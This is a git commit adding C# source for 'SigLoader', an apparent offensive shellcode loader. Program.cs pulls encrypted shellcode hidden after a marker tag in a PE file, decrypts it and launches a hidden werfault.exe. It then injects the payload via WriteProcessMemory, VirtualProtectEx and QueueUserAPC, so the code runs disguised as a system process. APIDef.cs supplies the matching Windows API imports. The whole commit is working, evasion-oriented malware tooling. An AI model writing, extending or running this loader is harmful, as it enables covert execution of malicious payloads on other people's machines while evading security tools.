7010aabb1d2ca98ed98f050a67386b404510d9a2
L.N <516421987@qq.com>
2021-08-10 17:59:37 +0800

    主要修改sigload的shellcode執行方式,以及修復了原代碼中的致命bug

---
+++ SigLoader/SigLoader/APIDef.cs
@@ -0,0 +1,223 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace SigLoader
+{
+    class APIDef
+    {
+        #region shellcode inject
+        public static UInt32 MEM_COMMIT = 0x1000;
+        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        public static UInt32 PAGE_READWRITE = 0x04;
+        public static UInt32 PAGE_EXECUTE_READ = 0x20;
+
+        [Flags]
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+        [Flags]
+        public enum ProcessCreationFlags : uint
+        {
+            ZERO_FLAG = 0x00000000,
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_NO_WINDOW = 0x08000000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_SEPARATE_WOW_VDM = 0x00001000,
+            CREATE_SHARED_WOW_VDM = 0x00001000,
+            CREATE_SUSPENDED = 0x00000004,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            DEBUG_PROCESS = 0x00000001,
+            DETACHED_PROCESS = 0x00000008,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+            INHERIT_PARENT_AFFINITY = 0x00010000
+        }
+        /*
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
+        }
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        */
+        [Flags]
+        public enum ThreadAccess : int
+        {
+            TERMINATE = (0x0001),
+            SUSPEND_RESUME = (0x0002),
+            GET_CONTEXT = (0x0008),
+            SET_CONTEXT = (0x0010),
+            SET_INFORMATION = (0x0020),
+            QUERY_INFORMATION = (0x0040),
+            SET_THREAD_TOKEN = (0x0080),
+            IMPERSONATE = (0x0100),
+            DIRECT_IMPERSONATION = (0x0200)
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
+            int dwThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            int nSize,
+            out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
+             Int32 size, UInt32 flAllocationType, UInt32 flProtect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(
+         ProcessAccessFlags processAccess,
+         bool bInheritHandle,
+         int processId
+        );
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("kernel32.dll")]
+        public static extern uint ResumeThread(IntPtr hThread);
+        [DllImport("kernel32.dll")]
+        public static extern uint SuspendThread(IntPtr hThread);
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
+        int dwSize, uint flNewProtect, out uint lpflOldProtect);
+        #endregion
+
+        #region pinvoke
+        //just copy-paste from stackoverflow,pinvoke.net,etc
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr handle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_PRIVILEGES
+        {
+            public uint PrivilegeCount;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public LUID_AND_ATTRIBUTES[] Privileges;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID_AND_ATTRIBUTES
+        {
+            public LUID Luid;
+            public UInt32 Attributes;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr pSecurityDescriptor;
+            public int bInheritHandle;
+        }
+        #endregion
+    }
+}
---
+++ SigLoader/SigLoader/Program.cs
@@ -0,0 +1,109 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using static SigLoader.APIDef;
+
+
+namespace SigLoader
+{
+    public class Program
+    {
+        public static string _pePath = "";
+        public static string _encKey = "";
+        public static string _pid = "";
+        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
+        public static void Main(string[] args)
+        {
+            ArgumentParser _parser = new ArgumentParser(args);
+
+            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true") {
+                Help();
+            }
+
+            if (_parser.GetOrDefault("f", "null") != "null") {
+                _pePath = _parser.GetOrDefault("f", "null");
+                _encKey = _parser.GetOrDefault("e", "null");
+
+                if (_pePath == "null") Help();
+            }
+            else {
+                Help();
+            }
+
+            if (!File.Exists(_pePath)) Help();
+
+            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
+            Console.WriteLine();
+
+            byte[] _peBlob = Utils.Read(_pePath);
+            int _dataOffset = Utils.scanPattern(_peBlob, _tag);
+
+            Console.WriteLine("[+]:Scanning for Shellcode...");
+            if ( _dataOffset == -1) {
+                Console.WriteLine("Could not locate data or shellcode");
+                Environment.Exit(0);
+            }
+
+            Stream stream = new MemoryStream(_peBlob);
+            long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
+            Console.WriteLine("[+]: Shellcode located at {0:x2}", pos);
+            //垃圾原始代碼
+            //byte[] shellcode = new byte[_peBlob.Length - (pos + _tag.Length)];
+            //stream.Read(shellcode, 0, (_peBlob.Length)- ((int)pos + _tag.Length));
+            byte[] shellcode = new byte[_peBlob.Length - (int)pos ];
+            stream.Read(shellcode, 0, (_peBlob.Length)- (int)pos);
+            byte[] b_shellcode = Utils.Decrypt(shellcode, _encKey);
+            stream.Close();
+
+            //Console.WriteLine(BitConverter.ToString(b_shellcode));
+            //執行shellcode
+            IntPtr tkn = WindowsIdentity.GetCurrent().Token;
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            si.lpDesktop = "WinSta0\\Default";
+            si.dwFlags = 0x101;
+            si.wShowWindow = 0;
+            if (CreateProcessAsUser(tkn, @"c:\Windows\System32\werfault.exe", null, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+            {
+
+                // 分配内存PAGE_READWRITE
+                IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, b_shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
+                IntPtr bytesWritten = IntPtr.Zero;
+
+                // 写入shellcode
+                //Marshal.Copy(b_shellcode, 0, resultPtr, b_shellcode.Length);
+                bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, b_shellcode, b_shellcode.Length, out bytesWritten);
+
+                // 打开线程
+                IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
+                uint oldProtect = 0;
+
+                // 修改内存权限PAGE_EXECUTE_READ
+                resultBool = VirtualProtectEx(pi.hProcess, resultPtr, b_shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+
+                // 把shellcode地址加入apc队列
+                IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);
+
+                IntPtr ThreadHandle = pi.hThread;
+                ResumeThread(ThreadHandle);
+
+                Console.WriteLine("[!] process with pid: {0} created.\r\n", pi.dwProcessId);
+            }
+        }
+
+        public static void Help()
+        {
+            Console.WriteLine();
+            Console.WriteLine("Usage:");
+            Console.WriteLine(@"   c:\> SigLoader.exe -f <PE_FILE_PATH> -e <ENCRYPTION_KEY>");
+            Console.WriteLine();
+            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\kernel32.dll -e TestKey");
+            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\MSBuild.exe -e TestKey");
+            Environment.Exit(0);
+        }
+
+
+    }
+}
